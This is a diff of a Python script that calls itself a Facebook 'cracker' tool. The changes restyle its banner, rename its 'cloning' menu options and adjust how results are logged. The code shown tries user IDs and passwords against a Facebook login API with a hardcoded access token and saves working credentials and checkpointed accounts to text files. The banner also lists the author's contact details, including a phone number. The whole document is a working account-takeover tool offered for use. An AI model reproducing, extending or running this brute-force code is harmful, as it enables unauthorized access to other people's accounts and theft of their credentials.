@@ -397,23 +397,21 @@ $$ /  \__|$$ |  $$ |$$ /  $$ |$$ |        $$ |  $$ /  $$ |
 $$\   $$ |$$ |  $$ |$$ |  $$ |$$ |        $$ |  $$ $$\$$ |      
 \$$$$$$  |$$ |  $$ |$$ |  $$ |$$ |      $$$$$$\ \$$$$$$ /       
  \______/ \__|  \__|\__|  \__|\__|      \______| \___$$$\       
-                                                     \___|                                              
-                                                                                                        
-                                                                                                        
+                                                     \___|                                                                                                                                                                                                                                  
   \033
 __________________×__×____________________
   
-  Auther   :  SHAFIQ SAWAND 
+  𝘼𝙪𝙩𝙝𝙤𝙧   :  SHAFIQ SAWAND 
  
-  Github   :  SHAFIQ-SAWAND 
+  𝙂𝙞𝙩𝙝𝙪𝙗   :  SHAFIQ-SAWAND 
 
-  Facebook :  SHAFIQ UR REHMAN 
+  𝙁𝙖𝙘𝙚𝙗𝙤𝙤𝙠 :  SHAFIQ UR REHMAN 
   
-  WHATSAPP :  +923106116534
+  𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 :  +923106116534
   
-  Youtube :  AVAILABLE SOON 
+  𝙔𝙤𝙪𝙏𝙪𝙗𝙚  :  AVAILABLE SOON 
 
-A POWERFUL FB CRACKER TOOL BY SHAFIQ SAWAND 
+ 𝘼 𝙋𝙊𝙒𝙀𝙍𝙁𝙐𝙇 𝙁𝘽 𝘾𝙍𝘼𝘾𝙆𝙀𝙍 𝙏𝙊𝙊𝙇 𝘽𝙔 𝙎𝙃𝘼𝙁𝙄𝙌 𝙎𝘼𝙒𝘼𝙉𝘿
 __________________×__×____________________\033[1;37m""")
 
 class Main:
@@ -427,8 +425,8 @@ class Main:
 		print("\n [1] File Cloning")
 		print(" [2] Public Cloning")
 		print(" [3] Create File")
-		print(" [4] 2009-10 Cloning")
-		print(" [5] 2011-14 Cloning")
+		print(" [4] 2005-10 Cloning")
+		print(" [5] 2011-12 Cloning")
 		print(" [6] Exit Programming\n")
 		JAHIED =input(" Choose : ")
 		if JAHIED in ["1", "01"]:
@@ -859,15 +857,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ JOKER-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SHAFIQ-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-SHAFIQ-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ SHAFIQ-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SHAFIQ-CP ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-SHAFIQ-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SHAFIQ-CP.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
